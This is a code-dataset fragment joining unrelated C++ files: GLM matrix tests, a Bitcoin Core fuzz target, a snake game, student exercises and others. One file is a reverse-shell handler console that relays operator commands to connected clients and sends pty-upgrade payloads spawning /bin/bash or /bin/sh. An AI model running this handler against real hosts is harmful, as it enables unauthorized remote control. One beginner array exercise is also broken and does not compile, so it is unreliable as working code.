4);\n\n\tglm::vec4 const V{0, 1, 2, 3};\n\n\tglm::mat4 const m1{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};\n\n\tglm::mat4 const m2{\n\t\tV,\n\t\t{4, 5, 6, 7},\n\t\t{8, 9, 10, 11},\n\t\t{12, 13, 14, 15}};\n\n\tError += glm::all(glm::equal(m0, m2, glm::epsilon<float>())) ? 0 : 1;\n\tError += glm::all(glm::equal(m1, m2, glm::epsilon<float>())) ? 0 : 1;\n\n\n\tstd::vector<glm::mat4> const m3{\n\t\t{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15},\n\t\t{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15},\n\t\t{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15},\n\t\t{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}};\n\n\tglm::mat4 const m4{\n\t\t{1, 0, 0, 0},\n\t\t{0, 1, 0, 0},\n\t\t{0, 0, 1, 0},\n\t\t{0, 0, 0, 1} };\n\n\tError += glm::equal(m4[0][0], 1.0f, 0.0001f) ? 0 : 1;\n\tError += glm::equal(m4[3][3], 1.0f, 0.0001f) ? 0 : 1;\n\n\tstd::vector<glm::mat4> const v1{\n\t\t{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15},\n\t\t{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}};\n\n\tstd::vector<glm::mat4> const v2{\n\t\t{\n\t\t\t{ 0, 1, 2, 3 },\n\t\t\t{ 4, 5, 6, 7 },\n\t\t\t{ 8, 9, 10, 11 },\n\t\t\t{ 12, 13, 14, 15 }\n\t\t},\n\t\t{\n\t\t\t{ 0, 1, 2, 3 },\n\t\t\t{ 4, 5, 6, 7 },\n\t\t\t{ 8, 9, 10, 11 },\n\t\t\t{ 12, 13, 14, 15 }\n\t\t}};\n\n#endif//GLM_HAS_INITIALIZER_LISTS\n\n\treturn Error;\n}\n\nstatic int test_member_alloc_bug()\n{\n\tint Error = 0;\n\t\n\tstruct repro\n\t{\n\t\trepro(){ this->matrix = new glm::mat4(); }\n\t\t~repro(){delete this->matrix;}\n\t\t\n\t\tglm::mat4* matrix;\n\t};\n\t\n\trepro Repro;\n\t\n\treturn Error;\n}\n\nstatic int test_size()\n{\n\tint Error = 0;\n\n\tError += 64 == sizeof(glm::mat4) ? 0 : 1;\n\tError += 128 == sizeof(glm::dmat4) ? 0 : 1;\n\tError += glm::mat4().length() == 4 ? 0 : 1;\n\tError += glm::dmat4().length() == 4 ? 0 : 1;\n\tError += glm::mat4::length() == 4 ? 0 : 1;\n\tError += glm::dmat4::length() == 4 ? 0 : 1;\n\n\treturn Error;\n}\n\nstatic int test_constexpr()\n{\n\tint Error = 0;\n\n#if GLM_HAS_CONSTEXPR\n\tstatic_assert(glm::mat4::length() == 4, \"GLM: Failed constexpr\");\n\tconstexpr glm::mat4 A(1.f);\n\tconstexpr glm::mat4 B(1.f);\n\tconstexpr glm::bvec4 C = glm::equal(A, B, 0.01f);\n\tstatic_assert(glm::all(C), \"GLM: Failed constexpr\");\n\n\tconstexpr glm::mat4 const Z(1.0f);\n\tError += glm::all(glm::equal(Z, glm::mat4(1.0f), glm::epsilon<float>())) ? 0 : 1;\n#endif\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_member_alloc_bug();\n\tError += test_ctr();\n\n\tError += test_operators<glm::mat4, glm::vec4>();\n\tError += test_operators<glm::lowp_mat4, glm::lowp_vec4>();\n\tError += test_operators<glm::mediump_mat4, glm::mediump_vec4>();\n\tError += test_operators<glm::highp_mat4, glm::highp_vec4>();\n\n\tError += test_oper",
    "#include \"ColorsDefinitions.h\"\n#include \"BuildDaemon.hpp\"\n#include <iostream>\n#include <fstream>\n#include <cstring>\n\nusing namespace std;\n\nvoid parsePathsFromArguments(const char *&configFile, const char *&logFile, char **argv, int argc)\n{\n    for (int i = 1; i < argc; i++)\n    {\n        if (strcmp(argv[i], \"-c\") == 0)\n        {\n            configFile = argv[i + 1];\n        }\n        else if (strcmp(argv[i], \"-l\") == 0)\n        {\n            logFile = argv[i + 1];\n        }\n    }\n}\n\nint main(int argc, char **argv)\n{\n    const char *configFile = nullptr;\n    const char *logFile = nullptr;\n    parsePathsFromArguments(configFile, logFile, argv, argc);\n\n    // TODO(Major): Configmanager is currently using string and vector in some places that should be replaced\n    // TODO: with const char * and char ** respectively to reduce size and reduce dependencies\n    // TODO(BUG): Currently ConfigManager is using c_str for many of the state variables which is causing\n    // TODO: state variables to become dangling pointers replace them with strcpy method\n    BuildDaemon buildDaemon(configFile, logFile);\n    buildDaemon.watch();\n    return 0;\n}",
    "// Copyright (c) Nouman Tajik [github.com/tajiknomi]\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include \"ServerQueries.h\"\n#include \"UsageHelper.h\"\n#include <iostream>\n#include <string>\n#include <vector>\n#include \"clientManager.h\"\n#include <sys/socket.h>\n#include <unistd.h>\n#include <unordered_map>\n#include \"signalManager.h\"\n\n#define INVALID_SOCKET -1\n\n\nstd::string first_numberstring(std::string const& str){\n\tchar const* digits = \"0123456789\";\n\tstd::size_t const n = str.find_first_of(digits);\n\tif (n != std::string::npos)\n\t{\n\t\tstd::size_t const m = str.find_first_not_of(digits, n);\n\t\treturn str.substr(n, m != std::string::npos ? m - n : m);\n\t}\n\treturn std::string();\n}\n\nvoid ServerQueries_t(std::shared_ptr<ClientsManager> clientManager_ptr) {\n\t\n\tblockSIGINT(); // Block SIGINT for this thread\n\n\twhile (true) {\n\n\t\tstd::string input_cmd;\n\t\tstd::getline(std::cin, input_cmd);\n\t\t\n\t\tif(input_cmd[0] == '!'){\n\t\t\tif(std::isdigit(input_cmd[1])){\n\t\t\t\tclientManager_ptr->setActiveClient(stoi(first_numberstring(input_cmd)));\n\t\t\t}\n\t\t\telse if (!(input_cmd.compare(0, std::string(\"!exit\").length(), std::string(\"!exit\")))) {\n\t\t\t\t::close(clientManager_ptr->getActiveClientSocket());\n\t\t\t}\n\t\t\telse if (!(input_cmd.compare(0, std::string(\"!list\").length(), std::string(\"!list\")))) {\n\t\t\t\tclientManager_ptr->printValidClients();\n\t\t\t}\n\t\t\telse if (!(input_cmd.compare(0, std::string(\"!clear\").length(), std::string(\"!clear\")))) {\n\t\t\t\tint retValue = std::system(\"clear\");\n\t\t\t}\n\t\t\telse if (!(input_cmd.compare(0, std::string(\"!tty\").length(), std::string(\"!tty\")))) {\n    \t\t\tstd::string ttyOption = input_cmd.substr(std::string(\"!tty\").length());\n    \t\t\tttyOption.erase(0, ttyOption.find_first_not_of(\" \\t\")); // Trim leading spaces\n\t\t\t\tif(ttyOption.empty()){\n\t\t\t\t\tttyOption = \"py3\";\t\t// default to python3 if not specified\n\t\t\t\t}\n\t\t\t\tconst std::unordered_map<std::string, std::string> ttyCommands = {\n\t\t\t\t\t{\"py\", \"python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\nexport TERM=xterm\\n\"},\n\t\t\t\t\t{\"py3\", \"python3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\nexport TERM=xterm\\n\"},\n\t\t\t\t\t{\"perl\", \"perl -e 'exec \\\"/bin/sh\\\";'\\nexport TERM=xterm\\n\"}\n\t\t\t\t};\n\t\t\t\t// Find the selected command\n\t\t\t\tauto it = ttyCommands.find(ttyOption);\n\t\t\t\tif (it != ttyCommands.end()) {\n\t\t\t\t\tconst std::string& tty = it->second;\n\t\t\t\t\t::send(clientManager_ptr->getActiveClientSocket(), tty.c_str(), tty.size(), 0);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (!(input_cmd.compare(0, std::string(\"!ctrlc\").length(), std::string(\"!ctrlc\")))) {\n\t\t\t\tchar ctrl_c = 0x03; // ASCII for Ctrl+C\n\t\t\t\t::send(clientManager_ptr->getActiveClientSocket(), &ctrl_c, 1, 0);\n\t\t\t}\n\t\t\telse if (!(input_cmd.compare(0, std::string(\"!quit\").length(), std::string(\"!quit\")))) {\n\t\t\t\texit(0);\t// terminate program\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintUsageExamples();\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t\tif (clientManager_ptr->getActiveClientSocket() == INVALID_SOCKET) {\n\t\t\tclientManager_ptr->printValidClients();\n\t\t\tcontinue;\n\t\t}\n\t\tinput_cmd.append(\"\\n\");\n\n\t\t//\tSend the packet through socket\n\t\t::send(clientManager_ptr->getActiveClientSocket(), input_cmd.c_str(), input_cmd.size(), 0);\n\t}\n}",
    "// Copyright (c) 2020-2022 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <node/mempool_persist.h>\n\n#include <node/mempool_args.h>\n#include <node/mempool_persist_args.h>\n#include <test/fuzz/FuzzedDataProvider.h>\n#include <test/fuzz/fuzz.h>\n#include <test/fuzz/util.h>\n#include <test/fuzz/util/mempool.h>\n#include <test/util/setup_common.h>\n#include <test/util/txmempool.h>\n#include <txmempool.h>\n#include <util/check.h>\n#include <util/time.h>\n#include <util/translation.h>\n#include <validation.h>\n\n#include <cstdint>\n#include <vector>\n\nusing node::DumpMempool;\nusing node::LoadMempool;\n\nusing node::MempoolPath;\n\nnamespace {\nconst TestingSetup* g_setup;\n} // namespace\n\nvoid initialize_validation_load_mempool()\n{\n    static const auto testing_setup = MakeNoLogFileContext<const TestingSetup>();\n    g_setup = testing_setup.get();\n}\n\nFUZZ_TARGET(validation_load_mempool, .init = initialize_validation_load_mempool)\n{\n    FuzzedDataProvider fuzzed_data_provider{buffer.data(), buffer.size()};\n    SetMockTime(ConsumeTime(fuzzed_data_provider));\n    FuzzedFileProvider fuzzed_file_provider{fuzzed_data_provider};\n\n    bilingual_str error;\n    CTxMemPool pool{MemPoolOptionsForTest(g_setup->m_node), error};\n    Assert(error.empty());\n\n    auto& chainstate{static_cast<DummyChainState&>(g_setup->m_node.chainman->ActiveChainstate())};\n    chainstate.SetMempool(&pool);\n\n    auto fuzzed_fopen = [&](const fs::path&, const char*) {\n        return fuzzed_file_provider.open();\n    };\n    (void)LoadMempool(pool, MempoolPath(g_setup->m_args), chainstate,\n                      {\n                          .mockable_fopen_function = fuzzed_fopen,\n                      });\n    pool.SetLoadTried(true);\n    (void)DumpMempool(pool, MempoolPath(g_setup->m_args), fuzzed_fopen, true);\n}\n",
    "//A simple snake game program.\r\n//Author: Ivan Lun Hui Chen\r\n//Date: 2023-09-15\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <array>\r\nusing namespace std;\r\n\r\nint main() {\r\n    //width and height of the matrix\r\n    int width;\r\n    int height;\r\n    cin >> width >> height;\r\n\r\n    //x and y coordinates of the apple\r\n    int xApple;\r\n    int yApple;\r\n    cin >> xApple >> yApple;\r\n\r\n    //number of snakes\r\n    int N;\r\n    cin >> N;\r\n\r\n    int number_snakes = 0;\r\n\r\n    vector<vector <int>> matrix(height, vector <int> (width));\r\n\r\n    matrix[yApple][xApple] = 5;\r\n\r\n    while (number_snakes < N) {\r\n        //k is the number of pair of segments of the snake\r\n        int k;\r\n        cin >> k;\r\n\r\n        //populating the snake vector with the x and y coordinates of the points of interest of the snake\r\n        int size = 2 * k + 1;\r\n        vector<int> snake(size);\r\n        snake[0] = k;\r\n\r\n        for (size_t i = 1; i < snake.size(); i++) {\r\n            cin >> snake[i];\r\n        }\r\n\r\n        //populating the matrix with the snake's body\r\n        for (size_t j = 1; j < (snake.size() - 2); j += 2) {\r\n            int x = snake[j];\r\n            int l = j + 1;\r\n            int y = snake[l];\r\n            matrix[y][x] = (number_snakes + 1);\r\n\r\n            //populating the matrix with the snake's body using two consecutive coordinates given\r\n            if (j < snake.size()) {\r\n                int nextX = snake[j + 2];\r\n                int nextL = j + 3;\r\n                int nextY = snake[nextL];\r\n\r\n                while (x != nextX) {\r\n                    if (x < nextX) {\r\n                        x++;\r\n                    }\r\n                    else if (x > nextX) {\r\n                        x--;\r\n                    }\r\n                    matrix[y][x] = (number_snakes + 1);\r\n                }\r\n\r\n                while (y != nextY) {\r\n                    if (y < nextY) {\r\n                        y++;\r\n                    }\r\n                    else if (y > nextY) {\r\n                        y--;\r\n                    }\r\n                    matrix[y][x] = (number_snakes + 1);\r\n                }\r\n            }\r\n        }\r\n\r\n        number_snakes += 1;\r\n    }\r\n\r\n    //printing the matrix\r\n    for (auto row : matrix) {\r\n        for (auto element : row) {\r\n            cout << element << ' ';\r\n        }\r\n        cout << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"day_13\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../inc/ScalarConverter.hpp\"\n#include <iomanip>\n#include <cmath>\n\nScalarConverter::ScalarConverter() {}\nScalarConverter::ScalarConverter(const ScalarConverter &) {}\nScalarConverter &ScalarConverter::operator=(const ScalarConverter &) { return *this; }\nScalarConverter::~ScalarConverter() {}\n\nchar\tconvertEscapeSequence(const std::string & literal) {\n\tstruct EscapeSequence {\n\t\tconst char *sequence;\n\t\tchar value;\n\t};\n\n\tEscapeSequence escapeSequences[] = {\n\t\t{\"\\\\n\", '\\n'},\n\t\t{\"\\\\t\", '\\t'},\n\t\t{\"\\\\r\", '\\r'},\n\t\t{\"\\\\v\", '\\v'},\n\t\t{\"\\\\f\", '\\f'},\n\t\t{\"\\\\b\", '\\b'},\n\t\t{\"\\\\0\", '\\0'}\n\t};\n\tfor (int i = 0; i < 7; ++i) {\n\t\tif (literal == escapeSequences[i].sequence) {\n\t\t\treturn escapeSequences[i].value;\n\t\t}\n\t}\n\treturn '\\0';\n}\n\nvoid\tScalarConverter::convert(const std::string &literal) {\n\tif (literal.empty()) {\n\t\tstd::cout << \"char: impossible\\nint: impossible\\nfloat: impossible\\ndouble: impossible\\n\";\n\t\treturn;\n\t}\n\n\tchar escapedChar = convertEscapeSequence(literal);\n\tif (escapedChar != '\\0') {\n\t\tconvertFromChar(std::string(1, escapedChar));\n\t\treturn;\n\t}\n\n\tif (isChar(literal)) {\n\t\tconvertFromChar(literal);\n\t} else if (isInt(literal)) {\n\t\tconvertToNumber(literal, std::strtold(literal.c_str(), NULL));\n\t} else if (isFloat(literal)) {\n\t\tconvertToNumber(literal, std::strtold(literal.c_str(), NULL));\n\t} else if (isDouble(literal)) {\n\t\tconvertToNumber(literal, std::strtold(literal.c_str(), NULL));\n\t} else if (isInfinite(literal)) {\n\t\tconvertFromInfinite(literal);\n\t} else {\n\t\tstd::cout << \"char: impossible\\nint: impossible\\nfloat: impossible\\ndouble: impossible\\n\";\n\t}\n}\n\nbool ScalarConverter::isChar(const std::string &literal) {\n\treturn literal.length() == 1 && std::isprint(literal[0]) && !std::isdigit(literal[0]);\n}\n\nbool ScalarConverter::isInt(const std::string &literal) {\n\tsize_t index = 0;\n\tif (literal[index] == '+' || literal[index] == '-') index++;\n\treturn literal.find_first_not_of(\"0123456789\", index) == std::string::npos;\n}\n\nbool ScalarConverter::isFloat(const std::string &literal) {\n\tif (literal == \"-inff\" || literal == \"+inff\" || literal == \"nanf\") return true;\n\n\tsize_t index = 0;\n\tif (literal[index] == '+' || literal[index] == '-') index++;\n\n\tsize_t dotPos = literal.find('.');\n\tif (dotPos == std::string::npos || literal[literal.length() - 1] != 'f') return false;\n\n\tstd::string beforeDot = literal.substr(index, dotPos - index);\n\tstd::string afterDot = literal.substr(dotPos + 1, literal.size() - dotPos - 2);\n\n\treturn !beforeDot.empty() && !afterDot.empty() &&\n\t\tbeforeDot.find_first_not_of(\"0123456789\") == std::string::npos &&\n\t\tafterDot.find_first_not_of(\"0123456789\") == std::string::npos;\n}\n\nbool ScalarConverter::isDouble(const std::string &literal) {\n\tif (literal == \"-inf\" || literal == \"+inf\" || literal == \"nan\") return true;\n\n\tsize_t index = 0;\n\tif (literal[index] == '+' || literal[index] == '-') index++;\n\n\tsize_t dotPos = literal.find('.');\n\tif (dotPos == std::string::npos) return false;\n\n\tstd::string beforeDot = literal.substr(index, dotPos - index);\n\tstd::string afterDot = literal.substr(dotPos + 1);\n\n\treturn !beforeDot.empty() && !afterDot.empty() &&\n\t\t\tbeforeDot.find_first_not_of(\"0123456789\") == std::string::npos &&\n\t\t\tafterDot.find_first_not_of(\"0123456789\") == std::string::npos;\n}\n\nbool\tScalarConverter::isInfinite(const std::string &literal) {\n\treturn literal == \"-inf\" || literal == \"+inf\" || literal == \"nan\" ||\n\t\t   literal == \"-inff\" || literal == \"+inff\" || literal == \"nanf\";\n}\n\nvoid ScalarConverter::convertFromChar(const std::string &literal) {\n\tchar c = literal[0];\n\tconvertToChar(c);\n\tstd::cout << \"int: \" << static_cast<int>(c) << std::endl;\n\tstd::cout << std::fixed << std::setprecision(1);\n\tstd::cout << \"float: \" << static_cast<float>(c) << \"f\" << std::endl;\n\tstd::cout << \"double: \" << static_cast<double>(c) << std::endl;\n}\n\nvoid\tScalarConverter::convertToNumber(const std::string &literal, long double number) {\n\t(void)literal;\n\n\tif (std::isnan(number)) {\n\t\tstd::cout << \"char: impossible\\nint: impossible\\nfloat: nanf\\ndouble: nan\\n\";\n\t\treturn;\n\t}\n\tif (std::isinf(number)) {\n\t\tstd::cout << \"char: impossible\\nint: impossible\\n\";\n\t\tstd::cout << \"float: \" << (number > 0 ? \"+inff\" : \"-inff\") << \"\\n\";\n\t\tstd::cout << \"double: \" << (number > 0 ? \"+inf\" : \"-inf\") << \"\\n\";\n\t\treturn;\n\t}\n\n\tif (number < std::numeric_limits<char>::min() || number > std::numeric_limits<char>::max()) {\n\t\tstd::cout << \"char: impossible\\n\";\n\t} else {\n\t\tconvertToChar(static_cast<char>(number));\n\t}\n\n\tif (number < std::numeric_limits<int>::min() || number > std::numeric_limits<int>::max()) {\n\t\tstd::cout << \"int: impossible\\n\";\n\t} else {\n\t\tstd::cout << \"int: \" << static_cast<int>(number) << std::endl;\n\t}\n\n\tstd::cout << std::fixed << std::setprecision(1);\n\tstd::cout << \"float: \" << static_cast<float>(number) << \"f\\n\";\n\tstd::cout << \"double: \" << static_cast<double>(number) << std::endl;\n}\n\nvoid\tScalarConverter::convertToChar(char c) {\n\tif (std::isprint(c)) {\n\t\tstd::cout << \"char: '\" << c << \"'\" << std::endl;\n\t} else {\n\t\tstd::cout << \"char: No",
    "#include <iostream>\nusing namespace std;\nint main() {\n    // sum\n    int arr[]={1,2,3,4,5,6,7,8,9,10};\n    int sum=0;\n    for(int i=0;i<10;i++){\n        sum=sum+arr[i];\n        \n    }\n    cout<<sum;\n    \n    // maximum\n    int arr[]={12,43,24,2253,3222};\n    int max=arr[0];\n    for(int i=0;i<5;i++){\n        if(max<arr[i]){\n            max=arr[i];\n        }\n        } cout<<max;\n    \n    // minimum\n    int arr[]={32,21,43,23,44};\n    int min=arr[1];\nfor(int i=0;i<5;++i){\n    if(min>arr[i]){\n        min=arr[i];\n    }\n}    cout<<min;\n\n// duplicate\nint arr[]={23,12,32,12,23};\nfor(int i=0;i<5;++i){\n    bool duplicate=false;\n    for(int j=i+1;j<5;++j){\n        if(arr[i]==arr[j]&&arr[i]!=-1){\n            arr[i]!=-1;\n            duplicate=true;\n        }\n    }\n    if(duplicate){\n        cout<<arr[i]<<endl;\n    }\n}\n\n// unique value\n\nint arr[]={12,23,23,12,34,22,19};\nfor(int i=0;i<7;i++){\n    bool duplicate=false;\n    for(int j=i+1;j<7;++j){\n        if(arr[i]==arr[j]&&arr[i]!=-1){\n            arr[j]=-1;\n            duplicate=true;\n        }\n    }\n    if(!duplicate&&arr[i]!=-1){\n        cout<<arr[i]<<endl;\n    }\n}\n    \n    // frequency\n    int arr[]={12,43,44,12,44};\n    for(int i=0;i<5;++i){\n        int count=1;\n        for(int j=i+1;j<5;j++){\n            if(arr[i]==arr[j]){\n                count++;\n                arr[j]=-1;\n            }\n        }\n        if(arr[i]!=-1){\n            cout<<\"the frequency of \"<<arr[i]<<\"is\"<<count<<endl;\n        }\n    }\n    \n    // missing number\n    \n    int arr[]={12,14,16,19,21};\n    for(int i=0;i<5;++i){\n        if(arr[i+1]-arr[i]>1){\n          cout<<arr[i]+1;\n        }\n    }\n    \n    // missing multiple number\n    \n    int arr[]={12,23,30,32,40};\n    for(int i=0;i<5;i++){\n        if(arr[i+1]-arr[i]>1){\n            for(int j=arr[i]+1;j<arr[i+1];j++){\n              cout<<j<<endl; \n            }\n        }\n    }\n    \n    // reverse large number\n    \n    int arr[]={21,34,23,24,32};\n    int k=4;\n    for(int i=0;i<k;i++){\n        for(int j=i+1;j<5;++j){\n            int temp;\n            temp==arr[i];\n            arr[i]==arr[j];\n            arr[j]==temp;\n        }\n        \n    }\n    cout<<arr[k-1];\n    \n    // target\n    \n    int arr[]={12,43,23,21,43};\n    int target=21;\n    for(int i=0;i<5;++i){\n        if(arr[i]==target){\n            cout<<\"yes\";\n            return 0;\n        }\n    }\n    cout<<\"no\";\n    \n    \n    // remove number\n    \n    int arr[]={12,32,12,34,36};\n    int remove=12;\n    for(int i=0;i<5;++i){\n        if(arr[i]!=remove){\n            cout<<arr[i]<<endl;\n        }\n    }\n    \n    // pallindrome\n    \n    int arr[]={1,2,3,2,1};\n    for(int i=0;i<5/2;++i){\n        if(arr[i]!=arr[5-i-1]){\n            cout<<\"not a pallindrome\";\n        \n            return 0;\n        }\n    }\n    cout<<\"pallindrome\";\n    \n    \n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nclass Etudiant {\r\nprivate:\r\n    static int compteur_id;\r\n    int Etudid;\r\n    string nom, prenom, filiere, niveau;\r\n\r\npublic:\r\n    Etudiant(string nom, string prenom, string filiere, string niveau)\r\n        : nom(nom), prenom(prenom), filiere(filiere), niveau(niveau) {\r\n        Etudid = ++compteur_id;\r\n    }\r\n\r\n    int getEtudiantId() const { return Etudid; }\r\n    string getNom() const { return nom; }\r\n    string getPrenom() const { return prenom; }\r\n    string getFiliere() const { return filiere; }\r\n    string getNiveau() const { return niveau; }\r\n\r\n    void setNom(const string& NewNom) { nom = NewNom; }\r\n    void setPrenom(const string& NewPrenom) { prenom = NewPrenom; }\r\n    void setFiliere(const string& NewFiliere) { filiere = NewFiliere; }\r\n    void setNiveau(const string& NewNiveau) { niveau = NewNiveau; }\r\n\r\n    friend ostream& operator<<(ostream& os, const Etudiant& etudiant) {\r\n        os << \"ID: \" << etudiant.Etudid << \" | Nom: \" << etudiant.nom\r\n           << \", Pr\u00e9nom: \" << etudiant.prenom << \" | Fili\u00e8re: \" << etudiant.filiere\r\n           << \", Niveau: \" << etudiant.niveau;\r\n        return os;\r\n    }\r\n\r\n    bool compareetu(const Etudiant& e) const {\r\n        return e.getEtudiantId() == this->Etudid;\r\n    }\r\n};\r\n\r\nint Etudiant::compteur_id = 0;\r\n\r\nclass GestionEtudiants {\r\nprivate:\r\n    static const int MAX_ETUDIANTS = 100;\r\n    vector<Etudiant> etudiants;\r\n\r\npublic:\r\n    bool etudiantExiste(const Etudiant& e) const {\r\n        for (const auto& etudiant : etudiants) {\r\n            if (etudiant.compareetu(e)) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool ajouterEtudiant(const Etudiant& e) {\r\n        if (etudiants.size() >= MAX_ETUDIANTS) {\r\n            cout << \"Erreur : Nombre maximum d'\u00e9tudiants atteint.\" << endl;\r\n            return false;\r\n        }\r\n        if (etudiantExiste(e)) {\r\n            cout << \"Erreur : L'\u00e9tudiant existe d\u00e9j\u00e0.\" << endl;\r\n            return false;\r\n        }\r\n        etudiants.push_back(e);\r\n        cout << \"\u00c9tudiant ajout\u00e9 avec succ\u00e8s.\" << endl;\r\n        return true;\r\n    }\r\n\r\n    void supprimerEtudiant() {\r\n        int id;\r\n        cout << \"Entrez l'ID de l'\u00e9tudiant \u00e0 supprimer : \";\r\n        cin >> id;\r\n\r\n        for (auto it = etudiants.begin(); it != etudiants.end(); ++it) {\r\n            if (it->getEtudiantId() == id) {\r\n                etudiants.erase(it);\r\n                cout << \"\u00c9tudiant supprim\u00e9 avec succ\u00e8s !\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Aucun \u00e9tudiant trouv\u00e9 avec l'ID \" << id << \".\" << endl;\r\n    }\r\n\r\n    void modifierEtudiant() {\r\n        int id;\r\n        cout << \"Entrez l'ID de l'\u00e9tudiant \u00e0 modifier : \";\r\n        cin >> id;\r\n\r\n        for (auto& etudiant : etudiants) {\r\n            if (etudiant.getEtudiantId() == id) {\r\n                string newNom, newPrenom, newFiliere, newNiveau;\r\n                cout << \"Entrez le nouveau nom : \";\r\n                cin >> newNom;\r\n                cout << \"Entrez le nouveau pr\u00e9nom : \";\r\n                cin >> newPrenom;\r\n                cout << \"Entrez la nouvelle fili\u00e8re : \";\r\n                cin >> newFiliere;\r\n                cout << \"Entrez le nouveau niveau : \";\r\n                cin >> newNiveau;\r\n\r\n                etudiant.setNom(newNom);\r\n                etudiant.setPrenom(newPrenom);\r\n                etudiant.setFiliere(newFiliere);\r\n                etudiant.setNiveau(newNiveau);\r\n\r\n                cout << \"\u00c9tudiant modifi\u00e9 avec succ\u00e8s !\" << endl;\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Aucun \u00e9tudiant trouv\u00e9 avec l'ID \" << id << \".\" << endl;\r\n    }\r\n\r\n    void afficherEtudiants() const {\r\n        for (const auto& etudiant : etudiants) {\r\n            cout << etudiant << endl;\r\n        }\r\n    }\r\n};\r\n\r\nclass Enseignant {\r\nprivate:\r\n    string nom;\r\n    string specialite;\r\n    string departement;\r\n\r\npublic:\r\n    Enseignant(string n, string s, string d)\r\n        : nom(n), specialite(s), departement(d) {}\r\n\r\n    string getNom() const { return nom; }\r\n    string getSpecialite() const { return specialite; }\r\n    string getDepartement() const { return departement; }\r\n\r\n    void setNom(const string& newNom) { nom = newNom; }\r\n    void setSpecialite(const string& newSpecialite) { specialite = newSpecialite; }\r\n    void setDepartement(const string& newDepartement) { departement = newDepartement; }\r\n\r\n    void afficher() const {\r\n        cout << \"Nom: \" << nom << \", Specialite: \" << specialite << \", Departement: \" << departement << endl;\r\n    }\r\n};\r\n\r\nclass GestionEnseignants {\r\nprivate:\r\n    vector<Enseignant> enseignants;\r\n\r\npublic:\r\n    void ajouterEnseignant(const Enseignant& enseignant) {\r\n        enseignants.push_back(enseignant);\r\n    }\r\n\r\n    void modifierEnseignant() {\r\n        string nom;\r\n        cout << \"Entrez le nom de l'enseignant \u00e0 modifier : \";\r\n        cin >> nom;\r\n\r\n        for (auto& enseignan",
